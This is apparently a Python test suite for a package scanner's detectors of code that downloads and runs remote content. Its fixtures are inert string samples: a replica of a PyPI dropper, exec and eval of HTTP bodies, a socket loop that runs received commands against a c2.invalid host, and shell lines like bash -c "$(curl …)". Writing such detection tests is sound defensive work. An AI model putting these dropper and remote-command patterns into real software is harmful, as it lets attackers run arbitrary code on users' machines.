"""Code that runs what it receives over the network (runs_received_code), and
a download substituted into a command line (runs_substituted_download).

The replica test of TrapDoor-style PyPI code — import-time code that downloads
code and runs it through an interpreter:

    code = urllib.request.urlopen('https://…').read().decode()
    subprocess.run(['node', '-e', code])

— was no finding at all: the only download-and-run test was the pipe test
(`curl … | sh` on an exec line). Neither was exec(requests.get(u).text), the
commonest PyPI dropper, nor eval of an https.get body, nor `sh -c "$(curl …)"`
in an install script. Now a received value (a download, a socket's or a
server's data) is followed through assignments, callback parameters, `with …
as` / `for` bindings and returning functions to a runner that takes it whole
as code or as a shell command: SC-IMPORT-RISK (MAJOR) at import time,
CRITICAL in install scripts (the reason "runs code it receives over the
network"). A value written into a larger string (`npm i pkg@${version}`,
'(' + text + ')'), a RegExp's exec, a file the download was saved to, and
code that only parses a response are not. A call's arguments are read with
quotes paired from its '(' (a regex literal's quote earlier on the row does
not hide it), and a row is read in one pass whatever it holds.

Everything is inert text: hosts are .invalid, nothing is executed.
"""

import time
import unittest

from lazaret.scanner import core

U = "'https://files.invalid/p'"
REASON = "runs code it receives over the network"

# (label, text, line runs_received_code reports)
RECEIVED = [
    ("TrapDoor: urlopen into node -e",
     "import subprocess, urllib.request\ncode = urllib.request.urlopen(" + U + ").read().decode()\n"
     "subprocess.run(['node', '-e', code])\n", 3),
    ("the same on one line",
     "import subprocess, urllib.request\nsubprocess.run(['node', '-e', urllib.request.urlopen(" + U + ")"
     ".read().decode()])\n", 2),
    ("exec of requests.get", "import requests\nexec(requests.get(" + U + ").text)\n", 2),
    ("exec of urlopen", "from urllib.request import urlopen\nexec(urlopen(" + U + ").read())\n", 2),
    ("sys.executable -c", "import subprocess, sys, requests\nsrc = requests.get(" + U + ").text\n"
     "subprocess.Popen([sys.executable, '-c', src])\n", 3),
    ("os.system of a download", "import os, urllib.request\ncmd = urllib.request.urlopen(" + U + ")"
     ".read().decode()\nos.system(cmd)\n", 3),
    ("shell=True", "import subprocess, requests\nscript = requests.get(" + U + ").text\n"
     "subprocess.run(script, shell=True)\n", 3),
    ("with … as", "import urllib.request\nwith urllib.request.urlopen(" + U + ") as resp:\n"
     "    code = resp.read().decode()\nexec(code)\n", 4),
    ("for … in", "import requests\nresp = requests.get(" + U + ", stream=True)\nfor line in resp.iter_lines():\n"
     "    exec(line)\n", 4),
    ("a helper that returns it", "import requests\n\ndef get_payload():\n    r = requests.get(" + U + ")\n"
     "    return r.text\n\nexec(get_payload())\n", 7),
    ("import … as", "import requests as r2\nexec(r2.get(" + U + ").text)\n", 2),
    ("__import__('os').system", "import requests\n__import__('os').system(requests.get(" + U + ").text)\n", 2),
    ("an f-string command line", "import os, requests\nsrc = requests.get(" + U + ").text\n"
     "os.system(f'python3 -c \"{src}\"')\n", 3),
    ("a %-formatted command line", "import os, requests\nsrc = requests.get(" + U + ").text\n"
     "os.system('python3 -c \"%s\"' % src)\n", 3),
    ("cmd /c", "import subprocess, requests\nbat = requests.get(" + U + ").text\n"
     "subprocess.Popen(['cmd', '/c', bat])\n", 3),
    ("a captured curl", "import subprocess\nsrc = subprocess.check_output(['curl', '-s', " + U + "]).decode()\n"
     "exec(src)\n", 3),
    ("a socket's commands", "import socket, subprocess\ns = socket.create_connection(('c2.invalid', 4444))\n"
     "while True:\n    cmd = s.recv(1024).decode()\n    subprocess.run(cmd, shell=True)\n", 5),
    ("https.get body to eval",
     "const https = require('https');\nhttps.get(" + U + ", (res) => {\n  let body = '';\n"
     "  res.on('data', (c) => { body += c; });\n  res.on('end', () => { eval(body); });\n});\n", 5),
    ("fetch to new Function",
     "(async () => {\n  const r = await fetch(" + U + ");\n  const code = await r.text();\n  new Function(code)();\n})();\n",
     4),
    ("a promise chain", "fetch(" + U + ").then((r) => r.text()).then((code) => eval(code));\n", 1),
    ("a promise chain over rows", "fetch(" + U + ")\n  .then((r) => r.text())\n  .then((code) => eval(code));\n", 3),
    ("spawn process.execPath -e",
     "const { spawn } = require('child_process');\nfetch(" + U + ").then((r) => r.text()).then((code) => {\n"
     "  spawn(process.execPath, ['-e', code], { detached: true }).unref();\n});\n", 3),
    ("child_process exec of a body",
     "const cp = require('child_process');\nconst https = require('https');\nhttps.get(" + U + ", (res) => {\n"
     "  let d = '';\n  res.on('data', (x) => (d += x));\n  res.on('end', () => cp.exec(d));\n});\n", 6),
    ("an async helper",
     "async function loadRemote(u) {\n  const r = await fetch(u);\n  return r.text();\n}\n"
     "loadRemote(" + U + ").then((c) => new Function(c)());\n", 5),
    ("an arrow helper far above", "const load = (u) => fetch(u).then((r) => r.text());\n" + "// …\n" * 80
     + "load(" + U + ").then((c) => eval(c));\n", 82),
    ("axios, destructured",
     "const axios = require('axios');\n(async () => {\n  const { data } = await axios.get(" + U + ");\n"
     "  eval(data);\n})();\n", 4),
    ("vm", "const https = require('https');\nconst vm = require('vm');\nhttps.get(" + U + ", (res) => {\n"
     "  let body = '';\n  res.on('data', (d) => { body += d; });\n  res.on('end', () => vm.runInThisContext(body));\n"
     "});\n", 6),
    ("new Function with parameters",
     "(async () => {\n  const code = await (await fetch(" + U + ")).text();\n"
     "  new Function('require', code)(require);\n})();\n", 3),
    ("XMLHttpRequest", "var x = new XMLHttpRequest();\nx.open('GET', " + U + ", false);\nx.send();\n"
     "eval(x.responseText);\n", 4),
    ("spawnSync python3 -c",
     "const { spawnSync } = require('child_process');\n(async () => {\n"
     "  const code = await (await fetch(" + U + ")).text();\n  spawnSync('python3', ['-c', code]);\n})();\n", 4),
    ("powershell -Command",
     "fetch(" + U + ").then((r) => r.text()).then((s) => spawn('powershell', ['-NoProfile', '-Command', s]));\n", 1),
    ("/bin/sh -c", "fetch(" + U + ").then((r) => r.text()).then((s) => spawn('/bin/sh', ['-c', s]));\n", 1),
    ("process.argv[0] -e", "fetch(" + U + ").then((r) => r.text()).then((c) => spawn(process.argv[0], ['-e', c]));\n",
     1),
    ("a template command line",
     "(async () => {\n  const code = await (await fetch(" + U + ")).text();\n"
     "  execSync(`node -e ${JSON.stringify(code)}`);\n})();\n", 3),
    ("a base64 wrapper",
     "(async () => {\n  const body = await (await fetch(" + U + ")).text();\n"
     "  eval(Buffer.from(body, 'base64').toString());\n})();\n", 3),
    ("a websocket", "const WebSocket = require('ws');\nconst ws = new WebSocket('wss://c2.invalid');\n"
     "ws.on('message', (msg) => eval(msg.toString()));\n", 3),
    ("a server that runs its requests",
     "const http = require('http');\nhttp.createServer((req, res) => {\n  let b = '';\n"
     "  req.on('data', (c) => (b += c));\n  req.on('end', () => { eval(b); res.end(); });\n}).listen(0);\n", 5),
    ("minified: a download written into a runner",
     "x" * 2000 + ";eval(await(await fetch(" + U + ")).text());" + "y" * 2000, 1),
    # quotes read as a language pairs them: a regex literal's quote before a
    # call, or around a binding, does not hide it
    ("a regex literal's quote before the runner",
     "if (/'/.test(v)) { new Function('a', await (await fetch(" + U + ")).text())(); }\n", 1),
    ("a binding between regex literals' quotes",
     "const q = /'/; const code = await (await fetch(" + U + ")).text(); const r = /'/;\neval(code);\n", 2),
    ("callbacks of an inline require",
     "require('https').get(" + U + ", (res) => { let b = ''; res.on('data', (c) => { b += c; }); "
     "res.on('end', () => eval(b)); });\n", 1),
    ("an argument padded with whitespace",
     "const code = await (await fetch(" + U + ")).text();\neval(" + " " * 600 + "code);\n", 2),
    ("a -c program that downloads and runs",
     "import subprocess, sys\nsubprocess.run([sys.executable, '-c', 'import urllib.request as u; "
     "exec(u.urlopen(\"https://files.invalid/p\").read())'])\n", 2),
]

NOT_RECEIVED = [
    ("a RegExp's exec", "const r = await fetch(u);\nconst body = await r.text();\nconst m = /v(\\d+)/.exec(body);\n"),
    ("a version in a command line",
     "const r = await fetch(u);\nconst latest = (await r.json()).version;\nexecSync('npm i -g pkg@' + latest);\n"
     "execSync(`npm i -g pkg@${latest}`);\n"),
    ("JSON the old way", "var xhr = new XMLHttpRequest();\n"
     "xhr.onload = function () { var o = eval('(' + xhr.responseText + ')'); };\n"),
    ("JSON.parse", "const res = await fetch(u);\nconst data = JSON.parse(await res.text());\n"),
    ("an argument to git", "import subprocess, requests\nurl = requests.get(api).json()['clone_url']\n"
     "subprocess.run(['git', 'clone', url])\n"),
    ("an argument to a local script", "const r = await fetch(u);\nconst v = await r.text();\nspawn('node', ['script.js', v]);\n"),
    ("a local file", "import requests\nexec(compile(open(f).read(), f, 'exec'))\n"),
    ("a literal", "import requests\ncode = 'print(1)'\nexec(code)\n"),
    ("a local command", "import requests\ncmd = 'ls ' + path\nos.system(cmd)\n"),
    ("a get() that is not requests'", "from requests import get\ncmd = os.environ.get('CMD')\nos.system(cmd)\n"),
    ("a static server", "const http = require('http');\nhttp.createServer((req, res) => {\n"
     "  res.end(fs.readFileSync('index.html'));\n}).listen(8080);\nconst code = fs.readFileSync(f, 'utf8');\neval(code);\n"),
    ("a re-exported module", "module.exports = require('https');\n\nmodule.exports.run = function (code) {\n"
     "  return eval(code);\n};\n"),
    ("a download saved to a file", "const https = require('https');\nconst fs = require('fs');\n"
     "https.get(u, (res) => res.pipe(fs.createWriteStream('bin/tool')));\n"),
    ("a literal script", "const r = await fetch(u);\nspawn(process.execPath, ['-e', 'console.log(1)']);\n"),
    ("a local script", "const r = await fetch(u);\nconst script = fs.readFileSync(p, 'utf8');\nspawn('node', ['-e', script]);\n"),
    ("a config value", "const r = await fetch(u);\nconst config = JSON.parse(fs.readFileSync(f, 'utf8'));\n"
     "eval(config.code);\n"),
    ("setup.py reading its version", "import urllib.request\nurllib.request.urlretrieve(url, 'x.tar.gz')\n"
     "exec(open('version.py').read())\n"),
    ("an archive unpacked", "https.get(u, (res) => {\n  const chunks = [];\n  res.on('data', (c) => chunks.push(c));\n"
     "  res.on('end', () => { fs.writeFileSync(f, Buffer.concat(chunks)); execSync('tar xf ' + f); });\n});\n"),
    ("argv to a shell", "import requests, subprocess, sys\ncmd = ' '.join(sys.argv[1:])\nsubprocess.run(cmd, shell=True)\n"),
    ("a fixed command", "const r = await fetch(u);\nif (r.ok) { exec('git pull'); }\n"),
    ("a method named exec", "const r = await fetch(u);\nclass Runner {\n  exec(r) {\n    return r;\n  }\n}\n"),
    ("too far apart", "import requests\nbody = requests.get(u).text\n" + "x = 1\n" * 60 + "exec(body)\n"),
    ("an annotation", "import requests\nbody: str = requests.get(u).text\nx = str(5)\nexec(str(compile_it()))\n"),
    ("a literal command line", "const r = await fetch(u);\nexecSync(`node -e \"console.log(1)\"`);\n"),
    ("another value in a command line",
     "const r = await fetch(u);\nconst script = 'console.log(1)';\nexecSync(`node -e ${script}`);\n"),
    ("websocket JSON", "const WebSocket = require('ws');\nconst ws = new WebSocket(url);\n"
     "ws.on('message', (msg) => { const data = JSON.parse(msg); render(data); });\n"),
    ("a subprocess call without shell=True", "import subprocess, requests\ncmd = requests.get(u).text\n"
     "subprocess.run(cmd.split())\nsubprocess.run(['ls'], shell=True)\n"),
    ("shell=True past the arguments read", "import subprocess, requests\ncmd = requests.get(u).text\n"
     "subprocess.run(cmd, " + "x=1, " * 100 + "shell=True)\n"),
]

SUBSTITUTED = [
    "bash -c \"$(curl -fsSL https://files.invalid/i.sh)\"", "sh -c '$(wget -qO- https://files.invalid/i.sh)'",
    "node -e \"$(curl -s https://files.invalid/p.js)\"", "python3 -c \"$(curl -s https://files.invalid/p.py)\"",
    "eval \"$(wget -qO- https://files.invalid/i.sh)\"", "eval `curl -s https://files.invalid/i.sh`",
    "source <(curl -s https://files.invalid/env.sh)", ". <(curl -s https://files.invalid/env.sh)",
    "bash <(curl -s https://files.invalid/i.sh)", "zsh -x -c \"$(curl -fsSL https://files.invalid/i.sh)\"",
]
NOT_SUBSTITUTED = [
    "echo \"$(curl -s https://files.invalid/version)\"", "V=$(curl -s https://files.invalid/version)",
    "curl -o i.sh https://files.invalid/i.sh", "diff <(curl -s https://files.invalid/a) b",
    "bash -c 'echo curl'", "sh ./install.sh",
]


class ReceivedCodeTests(unittest.TestCase):
    def test_received_code_is_found_on_its_line(self):
        for label, text, line in RECEIVED:
            with self.subTest(label):
                self.assertEqual(core.runs_received_code(text), line)

    def test_what_is_not_received_code(self):
        for label, text in NOT_RECEIVED:
            with self.subTest(label):
                self.assertIsNone(core.runs_received_code(text))

    def test_import_time_and_install_tests(self):
        for label, text, line in RECEIVED:
            with self.subTest(label):
                reasons, at = core.import_time_risk(text)
                self.assertIn(REASON, reasons)
                self.assertEqual(at, line)
                self.assertIn(REASON, core.install_script_risk(text))
        for label, text in NOT_RECEIVED:
            with self.subTest(label):
                self.assertNotIn(REASON, core.import_time_risk(text)[0])
                self.assertNotIn(REASON, core.install_script_risk(text))

    def test_the_trapdoor_replica_is_an_import_time_risk(self):
        text = RECEIVED[0][1]
        issue = core.dependency_import_issue("site-packages/trapdoor_py/__init__.py", text)
        self.assertEqual((issue["rule"], issue["sev"], issue["line"]), ("SC-IMPORT-RISK", "MAJOR", 3))
        self.assertEqual(issue["msg"], f"Dependency code {REASON}.")

    def test_bounded_work(self):
        # texts built to make the follower work, about 200 KB each: many
        # sources, names, runners, parameters, bindings, quotes and spaces on
        # rows of ordinary length; runners near network names on minified rows.
        # Each costs about one pass over it (a row is read once, whatever it
        # holds); reading a row's calls one by one took minutes on some.
        shapes = {
            "names and runners": "const code = await (await fetch(u)).text(); new Function(x)(); eval('y');\n" * 2700,
            "runners": ("fetch(u);" + "eval(" * 198 + "\n") * 200,
            "arguments": ("x=fetch(u);eval(" + "a," * 490 + "a)\n") * 200,
            "parameters": ("fetch(u).then(" + "x=>x," * 160 + "x=>x)\n") * 200 + "eval(zz)\n",
            "bindings": ("a=fetch(u);" + "b=a;" * 245 + "\n") * 200 + "eval(zz)\n",
            "functions": "".join(f"const fn{i} = (u) => fetch(u);\n" for i in range(6000)) + "eval(zz)\n",
            "quotes": ("fetch(u);" + "'eval(" * 165 + "\n") * 200,
            "spaces": ("fetch(u);function" + " " * 980 + "\nfor" + " " * 990 + "\n") * 100 + "eval(zz)\n",
            "minified": ("eval(" + "x" * 400 + "fetch(u)" + ");") * 500,
            "shell calls": "shell=True\n" + ("run(" * 100 + "fetch(u);") * 500,
        }
        start = time.monotonic()
        for label, text in shapes.items():
            with self.subTest(label):
                self.assertIsNone(core.runs_received_code(text))
        self.assertLess(time.monotonic() - start, 30)
        deep = "eval(" + "(" * 100000 + "fetch(u)" + ")" * 100000
        self.assertEqual(core.runs_received_code(deep), None)     # past the 50 parentheses read


class SubstitutedDownloadTests(unittest.TestCase):
    def test_a_download_handed_to_a_shell_or_interpreter(self):
        for row in SUBSTITUTED:
            with self.subTest(row):
                self.assertTrue(core.runs_substituted_download(row))
                self.assertIn(REASON, core.install_script_risk("#!/bin/sh\nset -e\n" + row + "\n"))
        for row in NOT_SUBSTITUTED:
            with self.subTest(row):
                self.assertFalse(core.runs_substituted_download(row))
                self.assertNotIn(REASON, core.install_script_risk("#!/bin/sh\n" + row + "\n"))

    def test_on_an_exec_line_it_is_the_shell_test(self):
        for text in ("require('child_process').execSync('bash -c \"$(curl -fsSL https://files.invalid/i.sh)\"');\n",
                     "import os\nos.system('eval \"$(wget -qO- https://files.invalid/i.sh)\"')\n"):
            with self.subTest(text):
                self.assertIn("runs a downloaded script through a shell", core.import_time_risk(text)[0])
                lang = "py" if text.startswith("import") else "js"
                rules = [i["rule"] for i in core.scan_file("x." + lang, text, lang)]
                self.assertIn("SC-PIPE-SHELL", rules)
        # help text: no exec call, so not the import-time or first-party test; an
        # install script is judged on its text, as the pipe test judges it
        help_text = "console.log('run: bash -c \"$(curl -fsSL https://files.invalid/i.sh)\"');\n"
        self.assertEqual(core.import_time_risk(help_text), ([], None))
        self.assertIsNone(core.runs_received_code(help_text))
        self.assertNotIn("SC-PIPE-SHELL", [i["rule"] for i in core.scan_file("x.js", help_text, "js")])
        self.assertEqual(core.install_script_risk(help_text), [REASON])
        self.assertEqual(core.install_script_risk("console.log('run: curl -fsSL https://files.invalid/i.sh | sh');\n"),
                         ["pipes a download into a shell"])


if __name__ == "__main__":
    unittest.main()
